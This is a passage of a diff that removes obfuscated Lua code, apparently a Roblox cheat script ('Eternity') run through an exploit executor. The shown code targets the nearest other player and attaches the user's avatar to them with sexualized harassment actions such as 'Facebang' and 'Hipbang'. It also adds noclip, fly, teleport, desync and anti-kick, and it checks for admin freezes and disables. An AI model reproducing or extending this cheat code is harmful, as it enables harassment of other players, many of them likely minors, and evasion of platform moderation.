-											nextBlock = 42
-										else
-											nextBlock = 42
-										end
-									end
-								end
-							elseif nextBlock == 42 then
-								if not facebangTarget then
-									facebangTarget = BagpackTarget
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 48
-										else
-											nextBlock = 48
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 48
-										else
-											nextBlock = 48
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 48
-										else
-											nextBlock = 48
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 48
-										else
-											nextBlock = 48
-										end
-									end
-								end
-							elseif nextBlock == 48 then
-								if not facebangTarget then
-									facebangTarget = typeof(pgPlayer) == "Instance"
-
-									if facebangTarget then
-										facebangTarget = pgPlayer
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 115
-										end
-									else
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 115
-										end
-									end
-								else
-									if facebangTarget then
-										nextBlock = 101
-									else
-										nextBlock = 115
-									end
-								end
-							elseif nextBlock == 52 then
-								if TargetPlayer.Character then
-									if arg3 then
-										head2 = TargetPlayer.Character:FindFirstChild("Head")
-
-										if not head2 then
-											head2 = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
-											nextBlock = 78
-										else
-											nextBlock = 78
-										end
-									else
-										head2 = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
-										nextBlock = 78
-									end
-								else
-									facebangTarget = FacebangTarget
-
-									if not facebangTarget then
-										facebangTarget = HipbangTarget
-										if not facebangTarget then
-											facebangTarget = PatTarget
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 59
-											else
-												nextBlock = 59
-											end
-										else
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 59
-											else
-												nextBlock = 59
-											end
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = PatTarget
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 59
-											else
-												nextBlock = 59
-											end
-										else
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 59
-											else
-												nextBlock = 59
-											end
-										end
-									end
-								end
-							elseif nextBlock == 59 then
-								if not facebangTarget then
-									facebangTarget = BackhugTarget
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 65
-										else
-											nextBlock = 65
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 65
-										else
-											nextBlock = 65
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 65
-										else
-											nextBlock = 65
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 65
-										else
-											nextBlock = 65
-										end
-									end
-								end
-							elseif nextBlock == 65 then
-								if not facebangTarget then
-									facebangTarget = BagpackTarget
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 71
-										else
-											nextBlock = 71
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 71
-										else
-											nextBlock = 71
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 71
-										else
-											nextBlock = 71
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 71
-										else
-											nextBlock = 71
-										end
-									end
-								end
-							elseif nextBlock == 71 then
-								if not facebangTarget then
-									facebangTarget = typeof(pgPlayer) == "Instance"
-
-									if facebangTarget then
-										facebangTarget = pgPlayer
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 102
-										end
-									else
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 102
-										end
-									end
-								else
-									nextBlock = 101
-								end
-							elseif nextBlock == 78 then
-								if head2 then
-									syncAttachTarget(TargetPlayer)
-									return TargetPlayer
-								else
-									facebangTarget = FacebangTarget
-
-									if not facebangTarget then
-										facebangTarget = HipbangTarget
-										if not facebangTarget then
-											facebangTarget = PatTarget
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 85
-											else
-												nextBlock = 85
-											end
-										else
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 85
-											else
-												nextBlock = 85
-											end
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = PatTarget
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 85
-											else
-												nextBlock = 85
-											end
-										else
-											if not facebangTarget then
-												facebangTarget = HeadsitTarget
-												nextBlock = 85
-											else
-												nextBlock = 85
-											end
-										end
-									end
-								end
-							elseif nextBlock == 85 then
-								if not facebangTarget then
-									facebangTarget = BackhugTarget
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 91
-										else
-											nextBlock = 91
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 91
-										else
-											nextBlock = 91
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 91
-										else
-											nextBlock = 91
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 91
-										else
-											nextBlock = 91
-										end
-									end
-								end
-							elseif nextBlock == 91 then
-								if not facebangTarget then
-									facebangTarget = BagpackTarget
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 97
-										else
-											nextBlock = 97
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 97
-										else
-											nextBlock = 97
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 97
-										else
-											nextBlock = 97
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 97
-										else
-											nextBlock = 97
-										end
-									end
-								end
-							elseif nextBlock == 97 then
-								if not facebangTarget then
-									facebangTarget = typeof(pgPlayer) == "Instance"
-
-									if facebangTarget then
-										facebangTarget = pgPlayer
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 115
-										end
-									else
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 115
-										end
-									end
-								else
-									if facebangTarget then
-										nextBlock = 101
-									else
-										nextBlock = 115
-									end
-								end
-							elseif nextBlock == 101 then
-								if facebangTarget.Character then
-									if arg3 then
-										head3 = facebangTarget.Character:FindFirstChild("Head")
-
-										if not head3 then
-											head3 = facebangTarget.Character:FindFirstChild("HumanoidRootPart")
-											if head3 then
-												syncAttachTarget(facebangTarget)
-												return facebangTarget
-											else
-												nextBlock = 115
-											end
-										else
-											if head3 then
-												syncAttachTarget(facebangTarget)
-												return facebangTarget
-											else
-												nextBlock = 115
-											end
-										end
-									else
-										head3 = facebangTarget.Character:FindFirstChild("HumanoidRootPart")
-										if head3 then
-											syncAttachTarget(facebangTarget)
-											return facebangTarget
-										else
-											nextBlock = 115
-										end
-									end
-								else
-									nextBlock = 102
-								end
-							elseif nextBlock == 102 then
-								player = nil
-								huge = math.huge
-								localPlayer_3 = Players_2
-
-								if localPlayer_3 then
-									localPlayer_3 = Players_2.LocalPlayer
-									if localPlayer_3 then
-										localPlayer_3 = Players_2.LocalPlayer.Character
-										nextBlock = 106
-									else
-										nextBlock = 106
-									end
-								else
-									if localPlayer_3 then
-										localPlayer_3 = Players_2.LocalPlayer.Character
-										nextBlock = 106
-									else
-										nextBlock = 106
-									end
-								end
-							elseif nextBlock == 106 then
-								if not localPlayer_3 then
-									localPlayer_3 = localPlayer_2
-
-									if localPlayer_3 then
-										localPlayer_3 = localPlayer_2.Character
-										if not localPlayer_3 then
-											localPlayer_3 = character2
-
-											if localPlayer_3 then
-												nextBlock = 126
-											else
-												nextBlock = 144
-											end
-										else
-											nextBlock = 126
-										end
-									else
-										if not localPlayer_3 then
-											localPlayer_3 = character2
-
-											if localPlayer_3 then
-												nextBlock = 126
-											else
-												nextBlock = 144
-											end
-										else
-											nextBlock = 126
-										end
-									end
-								else
-									if not localPlayer_3 then
-										localPlayer_3 = character2
-
-										if localPlayer_3 then
-											nextBlock = 126
-										else
-											nextBlock = 144
-										end
-									else
-										nextBlock = 126
-									end
-								end
-							elseif nextBlock == 115 then
-								player = nil
-								huge = math.huge
-								localPlayer_3 = Players_2
-
-								if localPlayer_3 then
-									localPlayer_3 = Players_2.LocalPlayer
-									if localPlayer_3 then
-										localPlayer_3 = Players_2.LocalPlayer.Character
-										nextBlock = 119
-									else
-										nextBlock = 119
-									end
-								else
-									if localPlayer_3 then
-										localPlayer_3 = Players_2.LocalPlayer.Character
-										nextBlock = 119
-									else
-										nextBlock = 119
-									end
-								end
-							elseif nextBlock == 119 then
-								if not localPlayer_3 then
-									localPlayer_3 = localPlayer_2
-
-									if localPlayer_3 then
-										localPlayer_3 = localPlayer_2.Character
-										nextBlock = 122
-									else
-										nextBlock = 122
-									end
-								else
-									nextBlock = 122
-								end
-							elseif nextBlock == 122 then
-								if not localPlayer_3 then
-									localPlayer_3 = character2
-
-									if localPlayer_3 then
-										nextBlock = 126
-									else
-										if step7 == 615741932 then
-											return player
-										else
-											step8 += 1330
-											step7 -= 41
-											step = 182906359
-											step6 = 212958601
-											L1.step4 -= 359
-											L1.step3 = 489990239
-											count = 137147211
-											L1.step2 = 852701822
-											nextBlock = 146
-										end
-									end
-								else
-									nextBlock = 126
-								end
-							elseif nextBlock == 126 then
-								humanoidRootPart3 = localPlayer_3:FindFirstChild("HumanoidRootPart")
-
-								if not humanoidRootPart3 then
-									humanoidRootPart3 = localPlayer_3:FindFirstChild("Torso")
-
-									if humanoidRootPart3 then
-										iterFn1, iterState1, iterControl1 = ipairs(Players_2:GetPlayers())
-										nextBlock = 129
-									else
-										nextBlock = 144
-									end
-								else
-									iterFn1, iterState1, iterControl1 = ipairs(Players_2:GetPlayers())
-									nextBlock = 129
-								end
-							elseif nextBlock == 129 then
-								v3, player2 = iterFn1(iterState1, iterControl1)
-
-								if v3 == nil then
-									if player then
-										targetWasAutoSelected = true
-										syncAttachTarget(player)
-										nextBlock = 144
-									else
-										if step7 == 615741932 then
-											return player
-										else
-											step8 += 1330
-											step7 -= 41
-											step = 182906359
-											step6 = 212958601
-											L1.step4 -= 359
-											L1.step3 = 489990239
-											count = 137147211
-											L1.step2 = 852701822
-											nextBlock = 146
-										end
-									end
-								else
-									iterControl1 = v3
-									localPlayer_4 = localPlayer_2
-
-									if not localPlayer_4 then
-										localPlayer_4 = Players_2.LocalPlayer
-										nextBlock = 133
-									else
-										nextBlock = 133
-									end
-								end
-							elseif nextBlock == 133 then
-								if player2 == localPlayer_4 or not player2.Character then
-									nextBlock = 129
-								else
-									humanoid3 = player2.Character:FindFirstChildOfClass("Humanoid")
-
-									if arg3 then
-										head4 = player2.Character:FindFirstChild("Head")
-
-										if not head4 then
-											head4 = player2.Character:FindFirstChild("HumanoidRootPart")
-
-											if humanoid3 and humanoid3.Health > 0 and head4 then
-												nextBlock = 138
-											else
-												nextBlock = 129
-											end
-										else
-											if humanoid3 and humanoid3.Health > 0 then
-												nextBlock = 138
-											else
-												nextBlock = 129
-											end
-										end
-									else
-										head4 = player2.Character:FindFirstChild("HumanoidRootPart")
-
-										if humanoid3 and humanoid3.Health > 0 and head4 then
-											nextBlock = 138
-										else
-											nextBlock = 129
-										end
-									end
-								end
-							elseif nextBlock == 138 then
-								magnitude = (head4.Position - humanoidRootPart3.Position).Magnitude
-
-								if magnitude < huge then
-									huge = magnitude
-									player = player2
-									nextBlock = 129
-								else
-									nextBlock = 129
-								end
-							elseif nextBlock == 144 then
-								if step7 == 615741932 then
-									return player
-								else
-									step8 += 1330
-									step7 -= 41
-									step = 182906359
-									step6 = 212958601
-									L1.step4 -= 359
-									L1.step3 = 489990239
-									count = 137147211
-									L1.step2 = 852701822
-									nextBlock = 146
-								end
-							elseif nextBlock == 146 then
-							end
-						end
-					end
-
-					function SetAttachState(arg, arg2)
-						local setActiveFeature, arg3
-
-						if arg2 then
-							if not tbl18.AdminDisabled and not tbl18.AttachLockedDisabled then
-								if tbl18.AdminFrozen then
-									if typeof(SendNotification) == "function" then
-										SendNotification("Action Blocked", "You cannot use attach features while frozen by an admin!", 3)
-									end
-
-									if tbl20[arg] then
-										tbl20[arg](false)
-									end
-
-									if _G.MobileButtonManager then
-										_G.MobileButtonManager.UpdateState(arg)
-									end
-
-									return
-								end
-
-								local pgPlayer_ = TargetPlayer or FacebangTarget or HipbangTarget or PatTarget or HeadsitTarget or BackhugTarget or FronthugTarget or ProposeTarget or BagpackTarget or GoonTarget or CustomAttachTarget
-
-								if not pgPlayer_ then
-									pgPlayer_ = typeof(pgPlayer) == "Instance"
-
-									if pgPlayer_ then
-										pgPlayer_ = pgPlayer
-									end
-								end
-
-								local v3 = nil
-								local v4, v5, v6 = ipairs(tbl21)
-								local callback = (function(...) local f, s, c = ... return coroutine.wrap(function() for k, v7, v32, v42, v52, v62, v72, v8 in f, s, c do coroutine.yield(true, k, v7, v32, v42, v52, v62, v72, v8) end end) end)(v4, v5, v6)
-								local packed
-
-								while true do
-									packed = table.pack(callback())
-
-									if not packed[1] then
-										break
-									end
-
-									local v7 = packed[3]
-									if v7 ~= arg and tbl18[v7] then
-										v3 = v7
-										break
-									end
-								end
-
-								if v3 then
-									if typeof(SendNotification) == "function" then
-										SendNotification("Action Blocked", "Please turn off " .. v3 .. " before using another attach!", 3)
-									end
-
-									if tbl20[arg] then
-										tbl20[arg](false)
-									end
-
-									return
-								end
-
-								if pgPlayer_ then
-									if arg == "Facebang" and not FacebangTarget then
-										FacebangTarget = pgPlayer_
-									elseif arg == "Hipbang" and not HipbangTarget then
-										HipbangTarget = pgPlayer_
-									elseif arg == "Pat" and not PatTarget then
-										PatTarget = pgPlayer_
-									elseif arg == "Headsit" and not HeadsitTarget then
-										HeadsitTarget = pgPlayer_
-									elseif arg == "Backhug" and not BackhugTarget then
-										BackhugTarget = pgPlayer_
-									elseif arg == "Fronthug" and not FronthugTarget then
-										FronthugTarget = pgPlayer_
-									elseif arg == "Propose" and not ProposeTarget then
-										ProposeTarget = pgPlayer_
-									elseif arg == "Bagpack" and not BagpackTarget then
-										BagpackTarget = pgPlayer_
-									elseif arg == "Goon" and not GoonTarget then
-										GoonTarget = pgPlayer_
-									elseif arg == "CustomAttach" and not CustomAttachTarget then
-										CustomAttachTarget = pgPlayer_
-									end
-
-									syncAttachTarget(pgPlayer_)
-
-									tbl18[arg] = arg2
-
-									if nil then
-										tbl20[arg](arg2)
-									end
-
-									if _G.SetActiveFeature then
-										setActiveFeature = _G.SetActiveFeature
-										arg3 = arg2
-
-										if arg3 then
-											arg3 = arg
-										end
-
-										arg3 = arg3 or nil
-										setActiveFeature(arg3)
-									end
-
-									if _G.MobileButtonManager then
-										_G.MobileButtonManager.UpdateState(arg)
-									end
-
-									return
-								else
-									local tbl22 = packed[2]
-
-									tbl18[arg] = arg2
-
-									if nil then
-										tbl20[arg](arg2)
-									end
-
-									if _G.SetActiveFeature then
-										setActiveFeature = _G.SetActiveFeature
-										arg3 = arg2
-
-										if arg3 then
-											arg3 = arg
-										end
-
-										arg3 = arg3 or nil
-										setActiveFeature(arg3)
-									end
-
-									if _G.MobileButtonManager then
-										_G.MobileButtonManager.UpdateState(arg)
-									end
-
-									return
-								end
-							end
-
-							if typeof(SendNotification) == "function" then
-								SendNotification("Action Blocked", "Attach features are disabled by an admin for this session.", 3)
-							end
-
-							if tbl20[arg] then
-								tbl20[arg](false)
-							end
-
-							if _G.MobileButtonManager then
-								_G.MobileButtonManager.UpdateState(arg)
-							end
-
-							return
-						end
-
-						task.defer(function()
-							task.wait(0.1)
-							clearAutoSelectedTarget()
-						end)
-
-						if step6 == 361451889 then
-							tbl18[arg] = arg2
-
-							if nil then
-								tbl20[arg](arg2)
-							end
-
-							if _G.SetActiveFeature then
-								setActiveFeature = _G.SetActiveFeature
-								arg3 = arg2
-
-								if arg3 then
-									arg3 = arg
-								end
-
-								setActiveFeature(arg3 or nil)
-							end
-
-							if _G.MobileButtonManager then
-								_G.MobileButtonManager.UpdateState(arg)
-							end
-
-							return
-						end
-					end
-
-					local tbl22 = {
-						ToggleGUI = Enum.KeyCode.RightControl,
-						MinimizeGUI = Enum.KeyCode.Comma,
-						GlitchMove = Enum.KeyCode.G,
-						SupermanFly = Enum.KeyCode.H,
-						ClickTeleport = Enum.KeyCode.F,
-						AnimatedTeleport = Enum.KeyCode.F,
-						Trip = Enum.KeyCode.T,
-						Reverse = Enum.KeyCode.R,
-						Facebang = Enum.KeyCode.Z,
-						Pat = Enum.KeyCode.P,
-						Headsit = Enum.KeyCode.X,
-						Backhug = Enum.KeyCode.B,
-						Fronthug = Enum.KeyCode.M,
-						Propose = Enum.KeyCode.V,
-						Hipbang = Enum.KeyCode.N,
-						Bagpack = Enum.KeyCode.J,
-						Goon = Enum.KeyCode.N,
-						CustomAttach = Enum.KeyCode.None,
-						Fakeout = Enum.KeyCode.K,
-						GlitchDesync = Enum.KeyCode.L,
-						GoUnderground = Enum.KeyCode.U,
-					}
-
-					SpeedMultiplier = 100
-
-					function saveSettings()
-						pcall(function()
-							if writefile and typeof(writefile) == "function" then
-								local tbl23 = {
-									SpeedValue = SpeedMultiplier,
-									Bind_ToggleGUI = tbl22.ToggleGUI.Name,
-									Bind_MinimizeGUI = tbl22.MinimizeGUI.Name,
-									Bind_GlitchMove = tbl22.GlitchMove.Name,
-									Bind_ClickTeleport = tbl22.ClickTeleport.Name,
-									Bind_AnimatedTeleport = tbl22.AnimatedTeleport.Name,
-									Bind_Trip = tbl22.Trip.Name,
-									Bind_Reverse = tbl22.Reverse.Name,
-									Bind_Facebang = tbl22.Facebang.Name,
-									Bind_Pat = tbl22.Pat.Name,
-									Bind_Headsit = tbl22.Headsit.Name,
-									Bind_Backhug = tbl22.Backhug.Name,
-									Bind_Fronthug = tbl22.Fronthug.Name,
-									Bind_Propose = tbl22.Propose.Name,
-									Bind_Hipbang = tbl22.Hipbang.Name,
-									Bind_Bagpack = tbl22.Bagpack.Name,
-									Bind_Goon = tbl22.Goon.Name,
-								}
-
-								local customAttach = tbl22.CustomAttach
-
-								if customAttach then
-									customAttach = tbl22.CustomAttach.Name
-								end
-
-								tbl23.Bind_CustomAttach = customAttach or "None"
-								tbl23.CustomAttachEmoteId = CustomAttachEmoteId
-								tbl23.CustomAttachFacing = CustomAttachFacing
-								tbl23.CustomAttachOffsetX = CustomAttachOffsetX
-								tbl23.CustomAttachOffsetY = CustomAttachOffsetY
-								tbl23.CustomAttachOffsetZ = CustomAttachOffsetZ
-								tbl23.Bind_Fakeout = tbl22.Fakeout.Name
-								tbl23.Bind_GlitchDesync = tbl22.GlitchDesync.Name
-								tbl23.Bind_GoUnderground = tbl22.GoUnderground.Name
-								tbl23.SavedAnimations = tbl18.SavedAnimations
-								tbl23.FavoriteAnimations = tbl18.FavoriteAnimations
-								tbl23.BigBaseplateColorR = math.floor(_bigBPSelectedColor.R * 255 + 0.5)
-								tbl23.BigBaseplateColorG = math.floor(_bigBPSelectedColor.G * 255 + 0.5)
-								tbl23.BigBaseplateColorB = math.floor(_bigBPSelectedColor.B * 255 + 0.5)
-								local themeColor = _themeColor
-
-								if themeColor then
-									themeColor = math.floor(_themeColor.R * 255 + 0.5)
-								end
-
-								tbl23.ThemeColorR = themeColor or nil
-								local themeColor2 = _themeColor
-
-								if themeColor2 then
-									themeColor2 = math.floor(_themeColor.G * 255 + 0.5)
-								end
-
-								tbl23.ThemeColorG = themeColor2 or nil
-								local themeColorB
-
-								if _themeColor then
-									themeColorB = math.floor(_themeColor.B * 255 + 0.5) or nil
-								end
-
-								tbl23.ThemeColorB = themeColorB
-								tbl23.UIBackgroundId = _uiBackgroundId
-								tbl23.ActiveShadeFile = tbl18.ActiveShadeFile
-								tbl23.ActiveShadeName = tbl18.ActiveShadeName
-								tbl23.ActiveTerrainFile = tbl18.ActiveTerrainFile
-								tbl23.ActiveTerrainName = tbl18.ActiveTerrainName
-								tbl23.ActiveWeatherType = tbl18.ActiveWeatherType
-								tbl23.ActiveWeatherName = tbl18.ActiveWeatherName
-								tbl23.PlatformMode = getgenv().EternityPlatformMode
-								tbl23.MobileButtonsEnabled = tbl18.MobileButtonsEnabled
-								tbl23.MobileButtonPositions = nil
-								tbl23.Toggles = {}
-
-								local tbl24 = {
-									Noclip = true,
-									InfiniteJump = true,
-									ClickTeleport = true,
-									ClickTeleportTool = true,
-									Trip = true,
-									Reverse = true,
-									GlitchMoveEnabled = true,
-									SupermanFlyEnabled = true,
-									SpeedBoost = true,
-									ForceWalkAnimation = true,
-									BigBaseplateActive = true,
-									FacebangEnabled = true,
-									PatEnabled = true,
-									HeadsitEnabled = true,
-									BackhugEnabled = true,
-									FronthugEnabled = true,
-									ProposeEnabled = true,
-									HipbangEnabled = true,
-									BagpackEnabled = true,
-									GoonEnabled = true,
-									CustomAttachEnabled = true,
-									FakeoutEnabled = true,
-									ExtremeGlitchDesyncEnabled = true,
-									NormalGlitchDesyncEnabled = true,
-									MobileButtonsEnabled = true,
-									AntiHeadsit = true,
-									AntiFacebang = true,
-									AntiKidnap = true,
-									AntiVoid = true,
-									InfFallVoid = true,
-									AntiKick = true,
-									AutoExecuteShader = true,
-									AutoExecuteTerrain = true,
-									AutoExecuteWeather = true,
-									AutoExecuteShader = true,
-									AutoExecuteTerrain = true,
-									AutoExecuteWeather = true,
-								}
-
-								for k in pairs(tbl19) do
-									if tbl24[k] and tbl18[k] then
-										tbl23.Toggles[k] = true
-									end
-								end
-
-								local ok, json = pcall(function()
-									return game:GetService("HttpService"):JSONEncode(tbl23)
-								end)
-
-								if ok then
-									writefile("eternity_config.json", json)
-								end
-							end
-						end)
-					end
-
-					local n214 = nil
-
-					function loadSettings()
-						local count2 = 929047292
-						n214 = 425705738
-						local n215 = nil
-
-						if step7 == 615741932 then
-							pcall(function()
-								local step9 = 968130634
-								n215 = 834709764
-								local count4 = 716484443
-
-								if readfile and typeof(readfile) == "function" and isfile and typeof(isfile) == "function" and isfile("eternity_config.json") then
-									local content = readfile("eternity_config.json")
-
-									local ok, result = pcall(function()
-										return game:GetService("HttpService"):JSONDecode(content)
-									end)
-
-									if ok and typeof(result) == "table" then
-										if result.Toggles and typeof(result.Toggles) == "table" then
-											local tbl23 = {
-												Noclip = true,
-												InfiniteJump = true,
-												ClickTeleport = true,
-												ClickTeleportTool = true,
-												Trip = true,
-												Reverse = true,
-												GlitchMoveEnabled = true,
-												SupermanFlyEnabled = true,
-												SpeedBoost = true,
-												BigBaseplateActive = true,
-												FacebangEnabled = true,
-												PatEnabled = true,
-												HeadsitEnabled = true,
-												BackhugEnabled = true,
-												FronthugEnabled = true,
-												ProposeEnabled = true,
-												HipbangEnabled = true,
-												BagpackEnabled = true,
-												GoonEnabled = true,
-												CustomAttachEnabled = true,
-												FakeoutEnabled = true,
-												ExtremeGlitchDesyncEnabled = true,
-												NormalGlitchDesyncEnabled = true,
-												AntiHeadsit = true,
-												AntiFacebang = true,
-												AntiKidnap = true,
-												AntiVoid = true,
-												InfFallVoid = true,
-												AntiKick = true,
-												AutoExecuteShader = true,
-												AutoExecuteTerrain = true,
-												AutoExecuteWeather = true,
-												AutoExecuteShader = true,
-												AutoExecuteTerrain = true,
-												AutoExecuteWeather = true,
-											}
-
-											for k, toggle in pairs(result.Toggles) do
-												if tbl23[k] then
-													tbl18[k] = toggle
-												end
-											end
-
-											if result.ActiveShadeFile then
-												tbl18.ActiveShadeFile = result.ActiveShadeFile
-											end
-
-											if result.ActiveShadeName then
-												tbl18.ActiveShadeName = result.ActiveShadeName
-											end
-
-											if result.ActiveTerrainFile then
-												tbl18.ActiveTerrainFile = result.ActiveTerrainFile
-											end
-
-											if result.ActiveTerrainName then
-												tbl18.ActiveTerrainName = result.ActiveTerrainName
-											end
-
-											if result.ActiveWeatherType then
-												tbl18.ActiveWeatherType = result.ActiveWeatherType
-											end
-
-											if result.ActiveWeatherName then
-												tbl18.ActiveWeatherName = result.ActiveWeatherName
-											end
-
-											if result.AutoFacebang then
-												tbl18.FacebangEnabled = true
-											end
-
-											if result.AutoInfiniteJump then
-												tbl18.InfiniteJump = true
-											end
-
-											if result.AutoSpeedBoost then
-												tbl18.SpeedBoost = true
-											end
-
-											if result.AutoNoclip then
-												tbl18.Noclip = true
-											end
-
-											if result.AutoClickTeleport then
-												tbl18.ClickTeleport = true
-											end
-
-											if result.AutoClickTeleportTool then
-												tbl18.ClickTeleportTool = true
-											end
-
-											if result.AutoGlitch then
-												tbl18.GlitchMoveEnabled = true
-											end
-
-											if result.AutoTrip then
-												tbl18.Trip = true
-											end
-
-											if result.AutoReverse then
-												tbl18.Reverse = true
-											end
-
-											if result.AutoPat then
-												tbl18.PatEnabled = true
-											end
-
-											if result.AutoHeadsit then
-												tbl18.HeadsitEnabled = true
-											end
-
-											if result.AutoBackhug then
-												tbl18.BackhugEnabled = true
-											end
-
-											if result.AutoFronthug then
-												tbl18.FronthugEnabled = true
-											end
-
-											if result.AutoPropose then
-												tbl18.ProposeEnabled = true
-											end
-
-											if result.AutoHipbang then
-												tbl18.HipbangEnabled = true
-											end
-
-											if result.AutoBagpack then
-												tbl18.BagpackEnabled = true
-											end
-
-											if result.AutoGoon then
-												tbl18.GoonEnabled = true
-											end
-
-											if result.AutoCustomAttach then
-												tbl18.CustomAttachEnabled = true
-											end
-
-											if result.SpeedValue then
-												if tonumber(result.SpeedValue) then
-													if tonumber(result.SpeedValue) > 0 then
-														SpeedMultiplier = tonumber(result.SpeedValue)
-													end
-												end
-											end
-										else
-											if result.ActiveShadeFile then
-												tbl18.ActiveShadeFile = result.ActiveShadeFile
-											end
-
-											if result.ActiveShadeName then
-												tbl18.ActiveShadeName = result.ActiveShadeName
-											end
-
-											if result.ActiveTerrainFile then
-												tbl18.ActiveTerrainFile = result.ActiveTerrainFile
-											end
-
-											if result.ActiveTerrainName then
-												tbl18.ActiveTerrainName = result.ActiveTerrainName
-											end
-
-											if result.ActiveWeatherType then
-												tbl18.ActiveWeatherType = result.ActiveWeatherType
-											end
-
-											if result.ActiveWeatherName then
-												tbl18.ActiveWeatherName = result.ActiveWeatherName
-											end
-
-											if result.AutoFacebang then
-												tbl18.FacebangEnabled = true
-											end
-
-											if result.AutoInfiniteJump then
-												tbl18.InfiniteJump = true
-											end
-
-											if result.AutoSpeedBoost then
-												tbl18.SpeedBoost = true
-											end
-
-											if result.AutoNoclip then
-												tbl18.Noclip = true
-											end
-
-											if result.AutoClickTeleport then
-												tbl18.ClickTeleport = true
-											end
-
-											if result.AutoClickTeleportTool then
-												tbl18.ClickTeleportTool = true
-											end
-
-											if result.AutoGlitch then
-												tbl18.GlitchMoveEnabled = true
-											end
-
-											if result.AutoTrip then
-												tbl18.Trip = true
-											end
-
-											if result.AutoReverse then
-												tbl18.Reverse = true
-											end
-
-											if result.AutoPat then
-												tbl18.PatEnabled = true
-											end
-
-											if result.AutoHeadsit then
-												tbl18.HeadsitEnabled = true
-											end
-
-											if result.AutoBackhug then
-												tbl18.BackhugEnabled = true
-											end
-
-											if result.AutoFronthug then
-												tbl18.FronthugEnabled = true
-											end
-
-											if result.AutoPropose then
-												tbl18.ProposeEnabled = true
-											end
-
-											if result.AutoHipbang then
-												tbl18.HipbangEnabled = true
-											end
-
-											if result.AutoBagpack then
-												tbl18.BagpackEnabled = true
-											end
-
-											if result.AutoGoon then
-												tbl18.GoonEnabled = true
-											end
-
-											if result.AutoCustomAttach then
-												tbl18.CustomAttachEnabled = true
-											end
-
-											if result.SpeedValue then
-												if tonumber(result.SpeedValue) then
-													if tonumber(result.SpeedValue) > 0 then
-														SpeedMultiplier = tonumber(result.SpeedValue)
-													end
-												end
-											end
-										end
-
-										if result.FacebangSpeedValue then
-											if tonumber(result.FacebangSpeedValue) then
-												FacebangSpeed = tonumber(result.FacebangSpeedValue)
-											end
-										end
-
-										if result.FacebangDistanceValue then
-											if tonumber(result.FacebangDistanceValue) then
-												FacebangDistance = tonumber(result.FacebangDistanceValue)
-											end
-										end
-
-										if result.HipbangSpeedValue then
-											if tonumber(result.HipbangSpeedValue) then
-												HipbangSpeed = tonumber(result.HipbangSpeedValue)
-											end
-										end
-
-										if result.HipbangDistanceValue then
-											if tonumber(result.HipbangDistanceValue) then
-												HipbangDistance = tonumber(result.HipbangDistanceValue)
-											end
-										end
-
-										if result.BigBaseplateColorR and result.BigBaseplateColorG and result.BigBaseplateColorB then
-											pcall(function()
-												local color3FromRGB = Color3.fromRGB
-												local n243 = tonumber(result.BigBaseplateColorR) or 128
-												local n244 = tonumber(result.BigBaseplateColorG) or 128
-												_bigBPSelectedColor = color3FromRGB(n243, n244, tonumber(result.BigBaseplateColorB) or 128)
-												if n215 < L1.step2 then
-													return
-												end
-											end)
-										end
-
-										if result.UIBackgroundId then
-											pcall(function()
-												_uiBackgroundId = result.UIBackgroundId
-												return
-											end)
-										end
-
-										if result.ThemeColorR and result.ThemeColorG and result.ThemeColorB then
-											pcall(function()
